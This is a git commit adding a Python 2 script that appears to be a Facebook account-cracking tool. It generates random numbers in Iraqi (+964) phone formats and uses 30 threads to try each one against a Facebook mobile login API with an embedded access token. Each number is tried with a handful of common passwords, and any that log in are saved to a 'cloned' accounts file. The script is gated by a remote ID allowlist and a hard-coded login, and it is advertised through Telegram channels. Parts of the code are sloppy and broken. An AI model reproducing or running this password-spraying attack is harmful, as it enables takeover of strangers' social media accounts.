e129fa80c8894cfca7eb512ae9ef8bcad3f88ace
BL4CK-d4y <76773607+BL4CK-d4y@users.noreply.github.com>
2021-04-13 02:13:03 +0300

    Create S4D_BL4CK_D4Y_S4D.py

---
+++ S4D_BL4CK_D4Y_S4D.py
@@ -0,0 +1,389 @@
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+import requests
+
+
+def chk():
+  uuid = str(os.geteuid()) + str(os.getlogin())
+  id = "-".join(uuid)
+  print("\x1b[37;1mYour ID : "+id)
+  try:
+    httpCaht = requests.get("https://raw.githubusercontent.com/4REZ/Active.txt/main/Active.txt").text
+    if id in httpCaht:
+      print("\033[92mYOUR ID IS ACTIVE.........")
+      msg = str(os.geteuid())
+      time.sleep(1)
+      pass
+    else:
+      print("\x1b[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @ravo_m.......")
+      time.sleep(1)
+      sys.exit()
+  except:
+    sys.exit()
+    if name == '__main__':
+     print(logo)
+     chk()
+   
+chk()
+
+
+
+
+
+
+os.system('rm -rf .txt')
+for n in range(5000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('No Module Named Requests! type:pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('No Module Named Mechanize! type:pip2 install mechanize')
+    time.sleep(1)
+    os.system('Then type: python2 fbi.py')
+
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def keluar():
+    print 'Thanks.'
+    os.sys.exit()
+
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!' + w[random.randint(0, len(w) - 1)] + i
+
+    return cetak(d)
+os.system('mkdir anggaxd/cloned.txt')
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
+
+    x += '\x1b[0m'
+    x = x.replace('!0', '\x1b[0m')
+    sys.stdout.write(x + '\n')
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.1)
+
+
+def tik():
+    titik = ['.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+back = 0
+oks = []
+id = []
+cpb = []
+vulnot = '\x1b[31mNot Vuln'
+vuln = '\x1b[32mVuln'
+os.system('clear')
+logo = """ 
+ 
+=======       //=====\\            ========       /_____\                  
+||    ||     //       \\           ||     ||    //       \\
+||    ||    //         \\          ||     ||   ||         ||
+=======    //===========\\         =======     ||         ||
+||        //             \\        ||           \\       //
+||       //               \\       ||             \_____/
+||      //                 \\      ||                  
+                                          
+                                          
+                                                               
+                                                                                         
+\033[97mAuther-BL4CK D4Y
+Telegram-@BL4CK_007_D4Y
+Telegram chanell-@BL4CK007D4Y
+Instagram : ue3ex
+NRX: 5$
+        """
+logo2 = """                                                                     
+ 
+=======       //=====\\            ========       /_____\                  
+||    ||     //       \\           ||     ||    //       \\
+||    ||    //         \\          ||     ||   ||         ||
+=======    //===========\\         =======     ||         ||
+||        //             \\        ||           \\       //
+||       //               \\       ||             \_____/
+||      //                 \\      ||                  
+                                          
+                                          
+                                                               
+                                                                                         
+\033[97mAuther-BL4CK D4Y
+Telegram-@BL4CK_007_D4Y
+Telegram chanell-@BL4CK007D4Y
+Instagram : ue3ex
+NRX: 5$
+       """
+CorrectUsername = 'BL4CK_D4Y'
+CorrectPassword = 'ig@ue3ex'
+os.system('clear')
+print logo2
+loop = 'true'
+while loop == 'true':
+    username = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1mUSERNAME: ')
+    if username == CorrectUsername:
+        password = raw_input('\x1b[1;97m\xe2\x9e\xa3\x1b\x1b[31;1mPASSWORD: ')
+        if password == CorrectPassword:
+            print '\x1b[1;92m[\xe2\x9c\x93] Tawawa  ' + username
+
+            
+            time.sleep(3)
+            loop = 'false'
+        else:
+            print 'galaty paxshan'
+    else:
+        print 'galaty paxshan'
+
+def lisensi():
+    os.system('clear')
+    menu()
+
+
+
+
+def menu():
+    os.system('clear')
+    print logo
+    print '\033[93m   [1]Erbil'
+    print '\033[93m   [2]Slemani'
+    print '\033[93m   [3]Kerkuk'
+    print '\033[93m   [4]Free Mod '
+    print '\033[93m   [5]Chemchemall'
+    print '\033[93m   [0]Bo darchun'
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    peak = raw_input('\n\x1b[1;91mHalbzhera ba daf3 nabm : \x1b[1;97m')
+    if peak == '':
+        print '[!] Fill In Correctly'
+        action()
+    elif peak == '1': 
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mZhmarayak halbzhera' + '\n'
+        print '\x1b[1;97m770 750 780 751 752 753 773  ' + '\n'
+        try:
+            c = raw_input('\x1b[1;97mHalbzhera Dllakam : ')
+            k = '+964'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '2': 
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mArea Codes With Network' + '\n'
+        print '\x1b[1;97m 770 750 780' + '\n'
+        try:
+            c = raw_input('\x1b[1;97mHALBZHERA DLLAKAM : ')
+            k = '+964'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '3':
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mArea Codes With Network' + '\n'
+        print '\x1b[1;97m 770 750 780\n'
+        try:
+            c = raw_input('\x1b[1;97mHALBZHERA DLLAKAM : ')
+            k = '+964'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif peak == '4':
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mArea Codes With Network' + '\n'
+        print '\x1b[1;97m 770 750 780' + '\n'
+        try:
+            c = raw_input('\x1b[1;97mHALBZHERA DLLAKAM : ')
+            k = '+964'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+            
+    elif peak == '5': 
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mArea Codes With Network' + '\n'
+        print '\x1b[1;97m 770 750 780' + '\n'
+        try:
+            c = raw_input('\x1b[1;97mHALBZHERA DLLAKAM : ')
+            k = '+964'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+            
+    elif peak == '0':
+        menu()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    xxx = str(len(id))
+    psb('[\xe2\x9c\x93] HAMU RAQAMAKAN: ' + xxx)
+    time.sleep(0.5)
+    psb('[\xe2\x9c\x93] HACK daste pekrd')
+    time.sleep(0.5)
+    psb('[\xe2\x9c\x93]  CHAWARE BA .......')
+    time.sleep(0.5)
+    psb('[!] BO WASTAN TOOL CTRL Z DABGRA')
+    time.sleep(0.5)
+    print '\x1b[31;1m<~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~>_<'
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('BL4CK')
+        except OSError:
+            pass
+
+        try:
+            pass1 = '1122334455' 
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACKED BL4CK007D4Y]  ' + k + c + user + '  \x1b[1;92m|  ' + pass1
+                okb = open('anggaxd/clone.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            else:
+                pass2 = '123456123456'
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;92m[HACKED BL4CK007D4Y]  ' + k + c + user + '  \x1b[1;92m|  ' + pass2
+                    okb = open('anggaxd/clone.txt', 'a')
+                    okb.write(k + c + user + pass2 + '\n')
+                    okb.close()
+                    oks.append(c + user + pass2)
+                else:
+                    pass3 = user
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m[HACKED BL4CK007D4Y]  ' + k + c + user + '  \x1b[1;92m|  ' + pass3
+                        okb = open('anggaxd/clone.txt', 'a')
+                        okb.write(k + c + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    else:
+                        pass4 = '123456654321'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;92m[HACKED BL4CK007D4Y]  ' + k + c + user + '  \x1b[1;92m|  ' + pass4
+                            okb = open('anggaxd/clone.txt', 'a')
+                            okb.write(k + c + user + pass4 + '\n')
+                            okb.close()
+                            oks.append(c + user + pass4)
+
+                        else:
+                            pass5 = '1234554321'
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print '\x1b[1;92m[HACKED BL4CK007D4Y]  ' + k + c + user + '  \x1b[1;92m|  ' + pass5
+                                okb = open('anggaxd/clone.txt', 'a')
+                                okb.write(k + c + user + pass5 + '\n')
+                                okb.close()
+                                oks.append(c + user + pass5)
+                        
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '\x1b[1;97m--------------------------------------------------'
+    print '[\xe2\x9c\x93] Process Has Been Completed ...'
+    print '[\xe2\x9c\x93] Total Successfully/Checkpoint : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
+    raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')
+    menu()
+
+
+if __name__ == '__main__':
+    menu()
+    
+    
